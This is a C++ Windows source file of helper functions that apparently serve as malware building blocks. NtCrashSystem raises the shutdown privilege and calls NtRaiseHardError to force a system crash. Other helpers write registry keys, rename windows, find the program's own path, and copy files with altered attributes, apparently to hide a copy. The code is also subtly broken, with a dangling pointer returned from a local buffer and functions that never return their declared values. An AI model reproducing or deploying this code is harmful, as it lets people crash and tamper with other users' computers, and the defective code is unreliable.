#include <windows.h>
#define DATE_YEAR 0
#define DATE_MONTH 1
#define DATE_DAY 2

extern "C" {
	NTSTATUS WINAPI RtlAdjustPrivilege(DWORD dwRtlPrivilege, BYTE bEnable, BYTE bClient, BYTE *Unused);
	NTSTATUS WINAPI NtRaiseHardError(NTSTATUS ntStatusCode, DWORD dwParamNum, DWORD dwOemStrParamMask, DWORD **ppdwParam, DWORD dwRspOption, DWORD *lpdwRsp);
}

DWORD SHUTDOWN_PRIVILEGE = 19;
DWORD OPTION_SHUTDOWN = 6;

typedef HANDLE HHEAP;

INT WINAPI EndThread(HANDLE hThread, HHEAP hHeap) {
	TerminateThread(hThread, 0);
	CloseHandle(hThread);
	HeapDestroy(hHeap);
}

INT WINAPI RedrawScr(VOID) {
	RedrawWindow(NULL, NULL, NULL, RDW_ALLCHILDREN | RDW_ERASE | RDW_INVALIDATE);
}

LPCWSTR GetDirectory(VOID) {
	WCHAR dir[MAX_PATH];
	GetModuleFileNameW(NULL, (WCHAR *)dir, MAX_PATH);
	return (LPCWSTR)dir;
}

namespace System {
	/* INT DateCheck(INT date) {
		SYSTEMTIME stm;
		GetSystemTime(&stm);
		switch (date) {
			case DATE_YEAR:
				return stm.wYear;
				break;
			case DATE_MONTH:
				return stm.wMonth;
				break;
			case DATE_DAY:
				return stm.wDay;
				break;
		}
	} Didn't end up using it. */
	
	BOOL IfWindowsXPVista(VOID) {
		OSVERSIONINFOW lpVersionInformation;
		memset(&lpVersionInformation, 0, sizeof(lpVersionInformation));
		lpVersionInformation.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
		GetVersionExW(&lpVersionInformation);
		if (lpVersionInformation.dwMajorVersion == 5) return TRUE;
		return FALSE;
	}
	
	VOID AdjustShutdownPriv(VOID) {
		BYTE Unused;
		RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &Unused);
	}
	
	DWORD64 NTAPI NtCrashSystem(BOOL isCustomMsg, NTSTATUS ntStatusCode, LPCTSTR tszParam) {
		DWORD lpdwRsp;
		AdjustShutdownPriv();
		if (isCustomMsg == false) NtRaiseHardError(ntStatusCode, 0, 0, NULL, OPTION_SHUTDOWN, &lpdwRsp);
		if (isCustomMsg == true) NtRaiseHardError(ntStatusCode, 0, 0, (DWORD**)tszParam, OPTION_SHUTDOWN, &lpdwRsp);
	}
	
	FLONG WINAPI ManageRegW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, BYTE lpData, LPBYTE lpData2, bool isSet, bool isString) {
	    HKEY hkResult;
	    if (isSet == false) {
	        if (isString == false) {
	            RegCreateKeyW(hKey, lpSubKey, &hkResult);
	            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
	        }
	        else if (isString == true) {
	            RegCreateKeyW(hKey, lpSubKey, &hkResult);
	            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
	        }
	    }
	    else if (isSet == true) {
	        if (isString == false) {
	            RegOpenKeyW(hKey, lpSubKey, &hkResult);
	            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
	        }
	        else if (isString == true) {
	            RegOpenKeyW(hKey, lpSubKey, &hkResult);
	            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
	        }
	    }
	}
	
	LRESULT WINAPI EnumProc(HWND hwnd, LPCTSTR tszProc) {
		SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)tszProc);
	}
	
	INT WINAPI CopyFileExt(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, DWORD dwFileAttributes) {
		CopyFileW(lpExistingFileName, lpNewFileName, TRUE);
		SetFileAttributesW(lpNewFileName, dwFileAttributes);
	}
}
